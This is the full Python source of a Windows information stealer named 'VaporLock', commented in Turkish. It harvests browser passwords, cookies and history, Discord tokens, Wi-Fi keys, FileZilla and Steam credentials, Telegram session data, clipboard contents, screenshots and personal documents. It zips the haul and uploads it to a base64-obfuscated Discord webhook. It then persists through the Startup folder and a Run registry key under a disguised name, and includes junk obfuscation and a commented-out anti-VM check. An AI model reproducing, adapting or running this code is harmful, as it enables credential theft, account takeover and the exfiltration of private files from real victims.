# VaporLock - Tam İşlevsel Veri Toplama Aracı (Test Modunda, VM Koruması Yorumlu)

import os
import sqlite3
import shutil
import json
import subprocess
import winreg
import ctypes
import base64
import urllib.parse
import urllib.request
import tempfile
import zipfile
import glob
import threading
import time
import sys
import platform
import uuid
import socket
import re
import xml.etree.ElementTree as ET
from typing import Dict, List, Any

# Üçüncü parti kütüphaneler
try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from PIL import ImageGrab
    PIL_OK = True
except ImportError:
    PIL_OK = False

try:
    import win32crypt
    WIN32CRYPT_OK = True
except ImportError:
    WIN32CRYPT_OK = False

try:
    import wmi
    WMI_OK = True
except ImportError:
    WMI_OK = False

# Base64 kodlanmış hassas stringler
B64_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg=="
B64_RUN_KEY = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"
B64_STARTUP_FOLDER = "TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtXFN0YXJ0VXA="
B64_CHROME_LOGIN = "TG9naW4gRGF0YQ=="
B64_CHROME_COOKIES = "Q29va2llcw=="
B64_CHROME_HISTORY = "SGlzdG9yeQ=="

def decode(s: str) -> str:
    return base64.b64decode(s).decode('utf-8')

WEBHOOK_URL = decode(B64_WEBHOOK)

# ------------------- JUNK CODE (OBFUSCATION) -------------------
def junk_loop():
    for _ in range(1000):
        _ = hash(str(_)) * 0.5 + 3.14
    return "junk_done"

# ------------------- ANTI-VM (TAMAMEN YORUM SATIRI) -------------------
# def anti_vm():
#     try:
#         # MAC kontrolü
#         mac = uuid.getnode()
#         mac_hex = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
#         if mac_hex.startswith('08:00:27') or mac_hex.startswith('00:0C:29') or mac_hex.startswith('00:50:56'):
#             sys.exit(1)
#         # RAM kontrolü (GlobalMemoryStatusEx)
#         class MEMORYSTATUSEX(ctypes.Structure):
#             _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
#                         ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
#                         ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
#                         ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
#                         ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
#         mem = MEMORYSTATUSEX()
#         mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
#         ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
#         if mem.ullTotalPhys // (1024**3) < 4:
#             sys.exit(1)
#         # Disk boyutu (C:)
#         free_bytes = ctypes.c_ulonglong(0)
#         total_bytes = ctypes.c_ulonglong(0)
#         ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p("C:\\"), None, ctypes.byref(total_bytes), None)
#         if total_bytes.value // (1024**3) < 80:
#             sys.exit(1)
#         # Sanal makine süreçleri
#         output = subprocess.check_output("tasklist", shell=True).decode('cp850', errors='ignore')
#         for proc in ['vboxservice', 'vmtoolsd', 'VBoxTray', 'vmwaretray']:
#             if proc.lower() in output.lower():
#                 sys.exit(1)
#         # Registry kontrolü
#         try:
#             key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
#             val = winreg.QueryValueEx(key, "Identifier")[0]
#             if "vmware" in val.lower() or "virtualbox" in val.lower():
#                 sys.exit(1)
#         except:
#             pass
#     except:
#         pass

# ------------------- FONKSİYONLAR -------------------
def get_system_info() -> Dict[str, Any]:
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['username'] = os.getlogin()
        info['os_version'] = platform.platform()
        # Local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
        # Public IP
        try:
            with urllib.request.urlopen("https://api.ipify.org", timeout=5) as f:
                info['public_ip'] = f.read().decode()
        except:
            info['public_ip'] = "Unknown"
        # CPU
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            info['cpu'] = winreg.QueryValueEx(key, "ProcessorNameString")[0]
        except:
            info['cpu'] = platform.processor()
        # RAM
        kernel32 = ctypes.windll.kernel32
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        info['ram_gb'] = round(mem.ullTotalPhys / (1024**3), 2)
        # GPU
        if WMI_OK:
            try:
                c = wmi.WMI()
                for gpu in c.Win32_VideoController():
                    if gpu.Name:
                        info['gpu'] = gpu.Name
                        break
            except:
                info['gpu'] = "Unknown"
        else:
            info['gpu'] = "Unknown"
        # Antivirus
        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\SecurityCenter2")
                av_list = []
                for av in c.AntivirusProduct():
                    av_list.append(av.displayName)
                info['antivirus'] = av_list
            except:
                info['antivirus'] = []
        else:
            info['antivirus'] = []
        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        info['error'] = str(e)
    return info

def get_browser_passwords(browser_paths: Dict[str, str]) -> Dict:
    results = {}
    for name, path in browser_paths.items():
        db_path = os.path.join(path, decode(B64_CHROME_LOGIN))
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            creds = []
            for url, username, enc_pass in rows:
                if not enc_pass:
                    continue
                try:
                    if WIN32CRYPT_OK:
                        decrypted = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    else:
                        decrypted = "[CRYPTO_FAIL]"
                except:
                    decrypted = "[DECRYPT_ERROR]"
                creds.append({"url": url, "username": username, "password": decrypted})
            results[name] = creds
            conn.close()
            os.remove(temp_db)
        except:
            pass
    return results

def get_browser_cookies(browser_paths: Dict[str, str]) -> Dict:
    results = {}
    for name, path in browser_paths.items():
        cookie_file = os.path.join(path, decode(B64_CHROME_COOKIES))
        if not os.path.exists(cookie_file):
            continue
        temp_cookie = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".db")
        try:
            shutil.copy2(cookie_file, temp_cookie)
            conn = sqlite3.connect(temp_cookie)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = []
            for host, cname, enc_val in cursor.fetchall():
                try:
                    if WIN32CRYPT_OK:
                        val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    else:
                        val = "[ENCRYPTED]"
                except:
                    val = "[ERROR]"
                cookies.append({"host": host, "name": cname, "value": val})
            results[name] = cookies
            conn.close()
            os.remove(temp_cookie)
        except:
            pass
    return results

def get_browser_history(browser_paths: Dict[str, str]) -> Dict:
    results = {}
    for name, path in browser_paths.items():
        hist_file = os.path.join(path, decode(B64_CHROME_HISTORY))
        if not os.path.exists(hist_file):
            continue
        temp_hist = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex + ".db")
        try:
            shutil.copy2(hist_file, temp_hist)
            conn = sqlite3.connect(temp_hist)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500")
            history = [{"url": row[0], "title": row[1], "visits": row[2]} for row in cursor.fetchall()]
            results[name] = history
            conn.close()
            os.remove(temp_hist)
        except:
            pass
    return results

def get_discord_tokens() -> List[str]:
    tokens = []
    paths = [
        os.path.expandvars("%APPDATA%\\discord\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordptb\\Local Storage\\leveldb"),
        os.path.expandvars("%APPDATA%\\discordcanary\\Local Storage\\leveldb"),
        os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb")
    ]
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    for p in paths:
        if not os.path.isdir(p):
            continue
        for f in glob.glob(os.path.join(p, "*.log")) + glob.glob(os.path.join(p, "*.ldb")):
            try:
                with open(f, 'r', errors='ignore') as file:
                    content = file.read()
                    tokens.extend(token_regex.findall(content))
            except:
                pass
    return list(set(tokens))

def get_wifi_passwords() -> Dict[str, str]:
    passwords = {}
    try:
        output = subprocess.check_output("netsh wlan show profile", shell=True, encoding='cp850', errors='ignore')
        for line in output.splitlines():
            if ":" in line and ("Tüm Kullanıcı Profili" in line or "All User Profile" in line):
                ssid = line.split(":")[1].strip()
                try:
                    details = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True, encoding='cp850', errors='ignore')
                    for det_line in details.splitlines():
                        if "Anahtar İçeriği" in det_line or "Key Content" in det_line:
                            pwd = det_line.split(":")[1].strip()
                            passwords[ssid] = pwd
                            break
                except:
                    pass
    except:
        pass
    return passwords

def get_filezilla_creds() -> List[Dict]:
    creds = []
    filezilla_path = os.path.expandvars("%APPDATA%\\FileZilla")
    sitemanager = os.path.join(filezilla_path, "sitemanager.xml")
    recentservers = os.path.join(filezilla_path, "recentservers.xml")
    for xml_file in [sitemanager, recentservers]:
        if not os.path.exists(xml_file):
            continue
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            for server in root.findall(".//Server"):
                host = server.findtext("Host", "")
                port = server.findtext("Port", "")
                user = server.findtext("User", "")
                pass_elem = server.find("Pass")
                password = pass_elem.text if pass_elem is not None else ""
                creds.append({"host": host, "port": port, "username": user, "password": password})
        except:
            pass
    return creds

def get_steam_session() -> List[str]:
    files = []
    steam_path = os.path.expandvars("%PROGRAMFILES(X86)%\\Steam\\config")
    if not os.path.isdir(steam_path):
        steam_path = os.path.expandvars("%PROGRAMFILES%\\Steam\\config")
    if os.path.isdir(steam_path):
        config_vdf = os.path.join(steam_path, "config.vdf")
        if os.path.exists(config_vdf):
            files.append(config_vdf)
        for ssfn in glob.glob(os.path.join(steam_path, "..", "ssfn*")):
            files.append(ssfn)
    return files

def get_telegram_tdata() -> str:
    tdata_path = os.path.expandvars("%APPDATA%\\Telegram Desktop\\tdata")
    if os.path.isdir(tdata_path):
        return tdata_path
    return None

def get_clipboard_text() -> str:
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        text = root.clipboard_get()
        root.destroy()
        return text
    except:
        try:
            return ctypes.windll.user32.GetClipboardData(13)  # CF_TEXT
        except:
            return ""

def take_screenshot() -> str:
    if not PIL_OK:
        return None
    try:
        img = ImageGrab.grab()
        path = os.path.join(tempfile.gettempdir(), f"scr_{uuid.uuid4().hex}.png")
        img.save(path)
        return path
    except:
        return None

def grab_desktop_files() -> List[str]:
    target_extensions = {'.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.zip', '.rar', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp', '.csv', '.log', '.conf', '.cfg', '.kdbx', '.wallet', '.dat'}
    collected = []
    folders = [os.path.expandvars("%USERPROFILE%\\Desktop"), os.path.expandvars("%USERPROFILE%\\Documents")]
    for folder in folders:
        if not os.path.isdir(folder):
            continue
        for root, dirs, files in os.walk(folder):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in target_extensions:
                    full_path = os.path.join(root, file)
                    collected.append(full_path)
    return collected

def collect_all(temp_dir: str):
    os.makedirs(temp_dir, exist_ok=True)
    threads = []
    results = {}

    def thread_wrapper(func, name, *args):
        try:
            res = func(*args)
            results[name] = res
        except:
            results[name] = None

    # Sistem bilgisi (senkron)
    results['system_info'] = get_system_info()

    # Tarayıcı yolları (gerçek sistemdeki)
    browser_paths = {}
    local_appdata = os.environ.get('LOCALAPPDATA', '')
    for browser, subpath in [('Chrome', 'Google\\Chrome\\User Data\\Default'),
                              ('Edge', 'Microsoft\\Edge\\User Data\\Default'),
                              ('Brave', 'BraveSoftware\\Brave-Browser\\User Data\\Default'),
                              ('Opera', 'Opera Software\\Opera Stable')]:
        full = os.path.join(local_appdata, subpath)
        if os.path.isdir(full):
            browser_paths[browser] = full

    t1 = threading.Thread(target=thread_wrapper, args=(get_browser_passwords, 'browser_passwords', browser_paths))
    t2 = threading.Thread(target=thread_wrapper, args=(get_browser_cookies, 'browser_cookies', browser_paths))
    t3 = threading.Thread(target=thread_wrapper, args=(get_browser_history, 'browser_history', browser_paths))
    t4 = threading.Thread(target=thread_wrapper, args=(get_discord_tokens, 'discord_tokens'))
    t5 = threading.Thread(target=thread_wrapper, args=(get_wifi_passwords, 'wifi_passwords'))
    t6 = threading.Thread(target=thread_wrapper, args=(get_filezilla_creds, 'filezilla_creds'))
    t7 = threading.Thread(target=thread_wrapper, args=(get_clipboard_text, 'clipboard'))
    t8 = threading.Thread(target=thread_wrapper, args=(take_screenshot, 'screenshot_path'))
    t9 = threading.Thread(target=thread_wrapper, args=(grab_desktop_files, 'desktop_files'))

    threads = [t1, t2, t3, t4, t5, t6, t7, t8, t9]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    # Steam dosyaları
    steam_files = get_steam_session()
    results['steam_files'] = steam_files
    # Telegram tdata
    tdata = get_telegram_tdata()
    results['telegram_tdata_path'] = tdata

    # JSON olarak kaydet
    with open(os.path.join(temp_dir, "collected.json"), "w", encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    # Discord tokenleri ayrı txt
    if results.get('discord_tokens'):
        with open(os.path.join(temp_dir, "discord_tokens.txt"), "w") as f:
            f.write("\n".join(results['discord_tokens']))

    # Wi-Fi
    if results.get('wifi_passwords'):
        with open(os.path.join(temp_dir, "wifi.json"), "w") as f:
            json.dump(results['wifi_passwords'], f)

    # Screenshot
    if results.get('screenshot_path') and os.path.exists(results['screenshot_path']):
        shutil.copy(results['screenshot_path'], temp_dir)

    # Dosya toplama (kopyala)
    if results.get('desktop_files'):
        files_dir = os.path.join(temp_dir, "files")
        os.makedirs(files_dir, exist_ok=True)
        for src in results['desktop_files']:
            try:
                dst = os.path.join(files_dir, os.path.basename(src))
                shutil.copy2(src, dst)
            except:
                pass

    # Steam dosyaları kopyala
    if results.get('steam_files'):
        steam_dir = os.path.join(temp_dir, "steam")
        os.makedirs(steam_dir, exist_ok=True)
        for f in results['steam_files']:
            try:
                shutil.copy2(f, steam_dir)
            except:
                pass

    # Telegram tdata kopyala
    if results.get('telegram_tdata_path') and os.path.isdir(results['telegram_tdata_path']):
        tdata_dst = os.path.join(temp_dir, "telegram_tdata")
        shutil.copytree(results['telegram_tdata_path'], tdata_dst, ignore_dangling_symlinks=True, ignore_errors=True)

def zip_data(source_dir: str, zip_path: str):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                full = os.path.join(root, file)
                arcname = os.path.relpath(full, source_dir)
                zf.write(full, arcname)

def exfiltrate(zip_path: str, webhook_url: str) -> bool:
    for attempt in range(3):
        try:
            if REQUESTS_OK:
                with open(zip_path, 'rb') as f:
                    resp = requests.post(webhook_url, files={'file': f}, timeout=30)
                if resp.status_code in (200, 204):
                    return True
            else:
                boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
                with open(zip_path, 'rb') as f:
                    file_data = f.read()
                body = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="data.zip"\r\nContent-Type: application/zip\r\n\r\n'.encode() +
                        file_data + f'\r\n--{boundary}--\r\n'.encode())
                req = urllib.request.Request(webhook_url, data=body, method='POST')
                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
                with urllib.request.urlopen(req, timeout=30) as resp:
                    if resp.status in (200, 204):
                        return True
        except:
            time.sleep(2)
    return False

def persistence():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            # Eğer script olarak çalışıyorsa persistence anlamlı değil, atla
            return
        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        dest = os.path.join(startup_folder, "winsvc.exe")
        shutil.copy2(exe_path, dest)
        # Registry Run
        key_path = decode(B64_RUN_KEY)  # "Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        rand_name = uuid.uuid4().hex[:8]
        winreg.SetValueEx(key, rand_name, 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)
    except:
        pass

def main():
    # anti_vm()  # Tamamen yorumlu
    junk_loop()
    temp_dir = os.path.join(tempfile.gettempdir(), uuid.uuid4().hex)
    try:
        collect_all(temp_dir)
        zip_path = os.path.join(tempfile.gettempdir(), "data.zip")
        zip_data(temp_dir, zip_path)
        exfiltrate(zip_path, WEBHOOK_URL)
        persistence()
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
        zip_path = os.path.join(tempfile.gettempdir(), "data.zip")
        if os.path.exists(zip_path):
            os.remove(zip_path)

if __name__ == "__main__":
    main()
